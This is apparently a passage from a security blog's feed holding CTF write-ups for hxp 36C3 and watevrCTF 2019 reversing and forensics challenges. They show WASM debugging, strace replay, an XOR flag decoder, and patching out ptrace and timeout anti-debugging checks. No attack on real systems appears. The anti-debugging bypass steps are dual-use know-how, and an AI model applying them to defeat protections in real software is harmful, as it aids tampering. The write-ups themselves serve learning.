&lt;img src=&#34;https://shreyansh26.github.io/post/2019-12-30_hxp-36c3-ctf/images/codes.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;p&gt;These are basically the codes for the three sections. Now all we have to do is connect to the given server and port and answer with these codes.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Activation code: 
76429
activated!
Sales activation code: 
sgk258
activated!
Leadership activation code: 
wmt275
activated
Service Roadmap (SRM) activation code: 
udh736
activated!
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;After this, we get the flag - &lt;code&gt;hxp{thx_f0r_4773nd1n6_70d4y}&lt;/code&gt;&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;h2 id=&#34;xmas_future---rev&#34;&gt;xmas_future - Rev&lt;/h2&gt;
&lt;p&gt;Files: &lt;a href=&#34;https://shreyansh26.github.io/post/2019-12-30_hxp-36c3-ctf/files/files.zip&#34;&gt;files.zip&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;This challenge is really close to my heart because this was the FIRST time ever I solved a WASM reveresing challenge. I literally had no clue on how to proceed, did a bit of researching and finally worked it out.&lt;/p&gt;
&lt;p&gt;First I thought of converting the .wasm file into some readable code like in C. I used the official &lt;a href=&#34;https://github.com/WebAssembly/wabt&#34;&gt;WebAssembly binary toolkit (wabt)&lt;/a&gt; for this. I used both the wasm2c and wasm2wat to get readable code. In the C file, there was one interesting function which was being called from the hxp2019.js file, the &lt;code&gt;check&lt;/code&gt; function, specifically the &lt;code&gt;$hxp2019::check::h578f31d490e10a31&lt;/code&gt; fnction. But it was a lot of code and I couldn&amp;rsquo;t make anyting out of it. Then I decided to read few wasm related CTF writeups. I learnt that I could actually use the debugger in the Chrome DevTools to go through it.&lt;/p&gt;
&lt;p&gt;Opening the html file directly in the browser wasn&amp;rsquo;t loading the js file due to CORS. I copied the folder into my &lt;code&gt;/var/www/html&lt;/code&gt; folder and accessed it from there using localhost.&lt;/p&gt;
&lt;p&gt;First I set a breakpoint at line 71 of the hxp2019.js file.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2019-12-30_hxp-36c3-ctf/images/debug1.png&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2019-12-30_hxp-36c3-ctf/images/debug1.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;p&gt;Stepping through the code line by line, we then get into the wasm code after line 73, i.e the wasm.check() function which passes the address where our input flag is stored and the length of the input. After this, on stepping into it, our code jumps into the wasm code.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2019-12-30_hxp-36c3-ctf/images/debug2.png&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2019-12-30_hxp-36c3-ctf/images/debug2.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;p&gt;Stepping through each line (and after having done this over and over many times, I kind of understood what each line of the code was doing), we reach line 12 where actually our length of input is being checked with 50. So, we have to make our input length 50. We supply a dummy flag &lt;code&gt;hxp{45 times &#39;a&#39;}&lt;/code&gt;. Then we see that on stepping throght the code, and doing a lot of calculations on some array stored in memory, each character of our input is sequentially comapred with another character. The character to be compared with is loaded at line 284.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2019-12-30_hxp-36c3-ctf/images/debug3.png&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2019-12-30_hxp-36c3-ctf/images/debug3.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;














&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2019-12-30_hxp-36c3-ctf/images/debug4.png&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2019-12-30_hxp-36c3-ctf/images/debug4.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;p&gt;Here, we see that the first character (&amp;lsquo;a&amp;rsquo; = 97) is to be compared with (109 = &amp;lsquo;m&amp;rsquo;). What I did next, may not be the right way, but I was so excited that I had made progress was that I did this whole process 45 times, adding one character to my &amp;ldquo;flag&amp;rdquo; at a time until I had all characters of the flag. I had tried changing the code at line 288 to &lt;code&gt;br_if 1&lt;/code&gt; but that seemed to crash somewhere. Anyways, whatever works during the CTF :stuck_out_tongue:.&lt;/p&gt;
&lt;p&gt;The flag was - &lt;code&gt;hxp{merry_xmas___github.com/benediktwerner/rewasm}&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;This could probably be the author of the chllenge as the repo is wasm reverse engineering tool. Loved the challenge!&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;junior-ctf&#34;&gt;Junior CTF&lt;/h1&gt;
&lt;h2 id=&#34;tracer---forensics&#34;&gt;tracer - Forensics&lt;/h2&gt;
&lt;p&gt;File: &lt;a href=&#34;https://shreyansh26.github.io/post/2019-12-30_hxp-36c3-ctf/files/tracer&#34;&gt;file&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;The file looks like strace running on some process. I decided to scroll right to the very bottom and saw&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;541   write(1, &amp;quot;\&amp;quot;Flag\&amp;quot;&amp;quot;, 6)           = 6
541   write(1, &amp;quot; [New] 1L, 24C written&amp;quot;, 22) = 22
541   write(3, &amp;quot;b0VIM 8.0\0\0\0\0\20\0\0\0\0\0\0\0\0\0\0\35\2\0\0root&amp;quot;..., 4096) = 4096
541   write(4, &amp;quot;# This viminfo file was generate&amp;quot;..., 1035) = 1035
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This meant that at the end something was being written to a file named Flag using vim. I started looking at the preceeding lines and saw text or vim commands being typed in (i.e the read command). From line no. 65782, is the interetsing part. This has &amp;lsquo;i&amp;rsquo; bein read, which is the command for insert in vim, that is typing began from here.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2019-12-30_hxp-36c3-ctf/images/vim.png&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2019-12-30_hxp-36c3-ctf/images/vim.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;p&gt;Now all I did was to focus on the &lt;code&gt;read&lt;/code&gt; commands and type in whatever that was read on my local computer in vim. I treated &lt;code&gt;\33&lt;/code&gt; as escape and just typed in whatever was being given as input as in the trace file.&lt;/p&gt;
&lt;p&gt;Eventually I ended with some text which seemed meaningful, there was some slight error whic I fixed by intuition.&lt;/p&gt;
&lt;p&gt;The flag was - &lt;code&gt;junior-nanoiswayBETTER!&lt;/code&gt;&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;h2 id=&#34;maybe---rev&#34;&gt;maybe - Rev&lt;/h2&gt;
&lt;p&gt;File: &lt;a href=&#34;https://shreyansh26.github.io/post/2019-12-30_hxp-36c3-ctf/files/chal1&#34;&gt;chal1&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;We open up the file in Ghidra and head to the main function.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2019-12-30_hxp-36c3-ctf/images/rev11.png&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2019-12-30_hxp-36c3-ctf/images/rev11.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;p&gt;Basically, if we see, the function is not doing anything, it is just taking our input of length 0x24 as a command line argument, then storing it at a +0x40 offset from a fixed string in memory, i.e. &amp;ldquo;junior-totally_the_flag_or_maybe_not&amp;rdquo;. The rest of the computations don&amp;rsquo;t mean anything as uvar3, ivar1, all are keeping the input unchanged. But the program still outputs &amp;ldquo;wrong!&amp;rdquo; and there does not seem to be any checking.&lt;/p&gt;
&lt;p&gt;After this I opened up GDB to analyse the flow. I set a breakpoint at the main function, and observed something interesting.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2019-12-30_hxp-36c3-ctf/images/re12.png&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2019-12-30_hxp-36c3-ctf/images/re12.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;p&gt;The fixed string &amp;ldquo;junior-totally_the_flag_or_maybe_not&amp;rdquo; is now changed to &amp;ldquo;ton_ebyam_ro_galf__flag_or_maybe_not&amp;rdquo;. This has to be because of some code running before main. Heading back to Ghidra, I opened the &lt;code&gt;_INIT_0&lt;/code&gt; and &lt;code&gt;_INIT_1&lt;/code&gt; functions since they run before the entry point is reached. The &lt;code&gt;_INIT_1&lt;/code&gt; function was the required code.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2019-12-30_hxp-36c3-ctf/images/re13.png&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2019-12-30_hxp-36c3-ctf/images/re13.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;p&gt;So, now after struggling for some time on the input evaluation part, I checked the &lt;code&gt;_FINI_0&lt;/code&gt; and &lt;code&gt;_FINI_1&lt;/code&gt; functions as well, as they run just before the end of the program. The &lt;code&gt;_FINI_1&lt;/code&gt; function had the required code.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2019-12-30_hxp-36c3-ctf/images/re14.png&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2019-12-30_hxp-36c3-ctf/images/re14.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;p&gt;Here we see that the string &amp;ldquo;ton_ebyam_ro_galf__flag_or_maybe_not&amp;rdquo; is XORed with our input string at offset +0x40. This is then compared with alternate elements of the array &lt;code&gt;&amp;amp;DAT_003010a0&lt;/code&gt;. The array contents are&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;b = [0x1E ,0x00 ,0x1A ,0x00 ,0x00 ,0x00 ,0x36 ,0x00 ,0x0A ,0x00 ,0x10 ,0x00 ,0x54 ,0x00 ,0x00 ,0x00 ,0x01 ,0x00 ,0x33 ,0x00 ,0x17 ,0x00 ,0x1C ,0x00 ,0x00 ,0x00 ,0x09 ,0x00 ,0x14 ,0x00 ,0x1E ,0x00 ,0x39 ,0x00 ,0x34 ,0x00 ,0x2A ,0x00 ,0x05 ,0x00 ,0x04 ,0x00 ,0x04 ,0x00 ,0x09 ,0x00 ,0x3D ,0x00 ,0x03 ,0x00 ,0x17 ,0x00 ,0x3C ,0x00 ,0x05 ,0x00 ,0x3E ,0x00 ,0x14 ,0x00 ,0x03 ,0x00 ,0x03 ,0x00 ,0x36 ,0x00 ,0x0F ,0x00 ,0x4E ,0x00 ,0x55 ,0x00]&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;So, all we have to do is XOR the fixed string with the alternate elements of this array and that should give us our flag.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;a &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ton_ebyam_ro_galf__flag_or_maybe_not&amp;#34;&lt;/span&gt;

b &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#ae81ff&#34;&gt;0x1E&lt;/span&gt; ,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x00&lt;/span&gt; ,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x1A&lt;/span&gt; ,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x00&lt;/span&gt; ,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x00&lt;/span&gt; ,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x00&lt;/span&gt; ,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x36&lt;/span&gt; ,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x00&lt;/span&gt; ,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x0A&lt;/span&gt; ,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x00&lt;/span&gt; ,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x10&lt;/span&gt; ,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x00&lt;/span&gt; ,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x54&lt;/span&gt; ,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x00&lt;/span&gt; ,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x00&lt;/span&gt; ,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x00&lt;/span&gt; ,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x01&lt;/span&gt; ,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x00&lt;/span&gt; ,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x33&lt;/span&gt; ,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x00&lt;/span&gt; ,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x17&lt;/span&gt; ,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x00&lt;/span&gt; ,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x1C&lt;/span&gt; ,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x00&lt;/span&gt; ,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x00&lt;/span&gt; ,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x00&lt;/span&gt; ,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x09&lt;/span&gt; ,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x00&lt;/span&gt; ,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x14&lt;/span&gt; ,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x00&lt;/span&gt; ,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x1E&lt;/span&gt; ,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x00&lt;/span&gt; ,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x39&lt;/span&gt; ,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x00&lt;/span&gt; ,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x34&lt;/span&gt; ,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x00&lt;/span&gt; ,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x2A&lt;/span&gt; ,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x00&lt;/span&gt; ,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x05&lt;/span&gt; ,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x00&lt;/span&gt; ,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x04&lt;/span&gt; ,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x00&lt;/span&gt; ,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x04&lt;/span&gt; ,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x00&lt;/span&gt; ,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x09&lt;/span&gt; ,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x00&lt;/span&gt; ,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x3D&lt;/span&gt; ,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x00&lt;/span&gt; ,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x03&lt;/span&gt; ,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x00&lt;/span&gt; ,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x17&lt;/span&gt; ,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x00&lt;/span&gt; ,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x3C&lt;/span&gt; ,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x00&lt;/span&gt; ,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x05&lt;/span&gt; ,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x00&lt;/span&gt; ,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x3E&lt;/span&gt; ,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x00&lt;/span&gt; ,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x14&lt;/span&gt; ,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x00&lt;/span&gt; ,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x03&lt;/span&gt; ,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x00&lt;/span&gt; ,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x03&lt;/span&gt; ,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x00&lt;/span&gt; ,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x36&lt;/span&gt; ,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x00&lt;/span&gt; ,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x0F&lt;/span&gt; ,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x00&lt;/span&gt; ,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x4E&lt;/span&gt; ,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x00&lt;/span&gt; ,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x55&lt;/span&gt; ,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x00&lt;/span&gt;]

flag &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;

b &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; b[::&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;]
&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(len(b)):
    flag &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; chr(b[i] &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; ord(a[i]))


&lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt;(flag)
&lt;span style=&#34;color:#75715e&#34;&gt;# &amp;#39;junior-alles_nur_kuchenblech_mafia!!&amp;#39;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The flag is - &lt;code&gt;junior-alles_nur_kuchenblech_mafia!!&lt;/code&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;I had great fun solving this CTF. Learnt a ton! This was my last CTF and blog post for 2019.&lt;/p&gt;
&lt;p&gt;2020 will see a lot more blog posts, writeups and some interesting security research too. Till then, sayonara.&lt;/p&gt;
&lt;script type=&#34;text/javascript&#34; src=&#34;//downloads.mailchimp.com/js/signup-forms/popup/unique-methods/embed.js&#34; data-dojo-config=&#34;usePlainJson: true, isDebug: false&#34;&gt;&lt;/script&gt;
&lt;!-- &lt;button style=&#34;background-color: #70ab17; color: #1770AB&#34; id=&#34;openpopup&#34;&gt;Subscribe to my posts!&lt;/button&gt; --&gt;
&lt;div class=&#34;button_cont&#34; align=&#34;center&#34;&gt;&lt;button id=&#34;openpopup&#34; class=&#34;example_a&#34;&gt;Subscribe to my posts!&lt;/button&gt;&lt;/div&gt;
&lt;style&gt;
    .example_a {
        color: #fff !important;
        text-transform: uppercase;
        text-decoration: none;
        background: #3f51b5;
        padding: 20px;
        border-radius: 5px;
        cursor: pointer;
        display: inline-block;
        border: none;
        transition: all 0.4s ease 0s;
    }

    .example_a:hover {
        background: #434343;
        letter-spacing: 1px;
        -webkit-box-shadow: 0px 5px 40px -10px rgba(0,0,0,0.57);
        -moz-box-shadow: 0px 5px 40px -10px rgba(0,0,0,0.57);
        box-shadow: 5px 40px -10px rgba(0,0,0,0.57);
        transition: all 0.4s ease 0s;
    }
&lt;/style&gt;
&lt;script type=&#34;text/javascript&#34;&gt;

function showMailingPopUp() {
    window.dojoRequire([&#34;mojo/signup-forms/Loader&#34;], function(L) { L.start({&#34;baseUrl&#34;:&#34;mc.us4.list-manage.com&#34;,&#34;uuid&#34;:&#34;0b10ac14f50d7f4e7d11cf26a&#34;,&#34;lid&#34;:&#34;667a1bb3da&#34;,&#34;uniqueMethods&#34;:true}) })

    document.cookie = &#34;MCPopupClosed=;path=/;expires=Thu, 01 Jan 1970 00:00:00 UTC&#34;;
}

document.getElementById(&#34;openpopup&#34;).onclick = function() {showMailingPopUp()};

&lt;/script&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;Follow me on &lt;a href=&#34;https://twitter.com/shreyansh_26&#34;&gt;Twitter&lt;/a&gt;, &lt;a href=&#34;https://github.com/shreyansh26&#34;&gt;Github&lt;/a&gt; or connect on &lt;a href=&#34;https://www.linkedin.com/in/shreyansh26/&#34;&gt;LinkedIn&lt;/a&gt;.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>watevrCTF 2019 Writeups (Mainly Rev and Pwn)</title>
      <link>https://shreyansh26.github.io/post/2019-12-15_watevr-ctf-2019-writeups/</link>
      <pubDate>Sun, 15 Dec 2019 11:44:06 +0530</pubDate>
      <guid>https://shreyansh26.github.io/post/2019-12-15_watevr-ctf-2019-writeups/</guid>
      <description>&lt;p&gt;This was a very fun CTF. Kudos to the organizers. I loved the problems, very interesting as well as challenging. I played this CTF with my team, &lt;a href=&#34;https://ctftime.org/team/72103&#34;&gt;Abs0lut3Pwn4g3&lt;/a&gt;. Our final rank was 54th.&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;rev-challeneges&#34;&gt;Rev Challeneges&lt;/h1&gt;
&lt;h2 id=&#34;timeout&#34;&gt;Timeout&lt;/h2&gt;
&lt;p&gt;File: &lt;a href=&#34;https://shreyansh26.github.io/post/2019-12-15_watevr-ctf-2019-writeups/files/timeout&#34;&gt;timeout&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;The binary is unstripped, so we can easily see the main function. The disassembly looks something like this.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2019-12-15_watevr-ctf-2019-writeups/images/timeout_1.png&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2019-12-15_watevr-ctf-2019-writeups/images/timeout_1.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;p&gt;The functions, &lt;code&gt;signal&lt;/code&gt;, &lt;code&gt;alarm&lt;/code&gt; and &lt;code&gt;delay&lt;/code&gt; all serve the same purpose, basically to either exit the program or delay its execution for a long time. We nop those out. So that our disassembly looks like this now.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2019-12-15_watevr-ctf-2019-writeups/images/timeout_2.png&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2019-12-15_watevr-ctf-2019-writeups/images/timeout_2.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;p&gt;We see that there is a flag &lt;em&gt;can_continnue&lt;/em&gt; which is set to 0x539, but not used in the code again. Checking the functions, we find one as &lt;code&gt;generate&lt;/code&gt;, which uses this variable and generates the flag. Now solving this is simple using a debugger. Set a breakpoint before exiting and transfer execution to this function, using &lt;code&gt;set $rip = 0x4006a6&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;We get the flag - &lt;strong&gt;watevr{3ncrytion_is_overrated_youtube.com/watch?v=OPf0YbXqDm0}&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;h2 id=&#34;hacking-for-vodka&#34;&gt;Hacking For Vodka&lt;/h2&gt;
&lt;p&gt;File: &lt;a href=&#34;https://shreyansh26.github.io/post/2019-12-15_watevr-ctf-2019-writeups/files/vodka&#34;&gt;vodka&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;The binary has different functionalities when run normally and when run in a debugger. We know this because of the &lt;em&gt;ptrace&lt;/em&gt; call.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2019-12-15_watevr-ctf-2019-writeups/images/vodka_1.png&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2019-12-15_watevr-ctf-2019-writeups/images/vodka_1.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;p&gt;I decide to analyse just the part which would have been evaded we were to run in a debugger, i.e the FUN_001012bf function. Inside that, there are a few more fuction calls and variables are set on stack. The intersesting part is the FUN_0010092a function.&lt;/p&gt;
&lt;p&gt;Inside that function, which looks very complicated, there is an fgets call which is used to get our input and a strcmp to validate the input.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2019-12-15_watevr-ctf-2019-writeups/images/vodka_2.png&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2019-12-15_watevr-ctf-2019-writeups/images/vodka_2.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;p&gt;Also, there is a loop which suggests that the string to be matched with is constructed character by character. I use dynamic analysis, setting a breakpoint at the strcmp call, and checking at each step and modifying our input accordingly. Although the process is a bit tedious, but I still managed to get the flag string. Anything works during the CTF, as long as you get the flag :stuck_out_tongue:.&lt;/p&gt;
&lt;p&gt;PS - Before the dynamic analysis, we patch the &lt;code&gt;PTRACE_TRACEME&lt;/code&gt; call to jump to the required function.&lt;/p&gt;
&lt;p&gt;The flag is - &lt;strong&gt;watevr{th4nk5_h4ck1ng_for_s0ju_hackingforsoju.team}&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;h2 id=&#34;esrever&#34;&gt;esreveR&lt;/h2&gt;
&lt;p&gt;File: &lt;a href=&#34;https://shreyansh26.github.io/post/2019-12-15_watevr-ctf-2019-writeups/files/esrever&#34;&gt;esrever&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;This was a very fun challenge. When we open the binary, we see that the main function is heavily obfuscated. Not obfuscated in the true sense, but a lot is going on. For those using Ghidra, FUN_001018f3 is the main function. We see a lot of variables and a whole lot of precomputation. It is as late as in the 174th line that there is an fgets call to take our input.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2019-12-15_watevr-ctf-2019-writeups/images/reverse_1.png&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2019-12-15_watevr-ctf-2019-writeups/images/reverse_1.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;p&gt;So, I set breakpoints at various places, to check what all is being computed. It is interesting that our input is used quite late in the code. It is used as a parameter to FUN_001012d8, which looks like something which will validate our input.&lt;/p&gt;
&lt;p&gt;On checking that function, there is a call to another function FUN_00100ba0 with a large number of parameters, formed by basic bit manipulations (using XOR) with the precomputed values. Our input string is also sent with it. Then we check this function FUN_00100ba0. It has 57 parameters. And in this we see that our input is checked each of the remaining 56 parameters character wise. So, basically the 56 parameters is our flag.&lt;/p&gt;
&lt;p&gt;Again, dynamic analysis was key here.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2019-12-15_watevr-ctf-2019-writeups/images/reverse_2.png&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2019-12-15_watevr-ctf-2019-writeups/images/reverse_2.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;p&gt;Before the function call, the parameters are pushed onto the stack. We read these values by printing a larger number of values form &lt;code&gt;$ebp-0x10&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Tha flag was - &lt;strong&gt;watevr{esrever_reversed_youtube.com/watch?v=I8ijb4Zee5E}&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;h2 id=&#34;watshell&#34;&gt;watshell&lt;/h2&gt;
&lt;p&gt;File: &lt;a href=&#34;https://shreyansh26.github.io/post/2019-12-15_watevr-ctf-2019-writeups/files/watshell&#34;&gt;watshell&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;In this problem, we have to send an input to the service, which will be decrypted, checked against a fixed string - &amp;ldquo;give_me_the_flag_please&amp;rdquo;, and only then do we get the flag.&lt;/p&gt;
&lt;p&gt;So, I started at the main function FUN_0010178b. Again like, the first problem, Timeout, there are a few inital timeout checks, which I patched. There is some precomputation being done before we enter our input.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2019-12-15_watevr-ctf-2019-writeups/images/watshell_1.png&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2019-12-15_watevr-ctf-2019-writeups/images/watshell_1.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

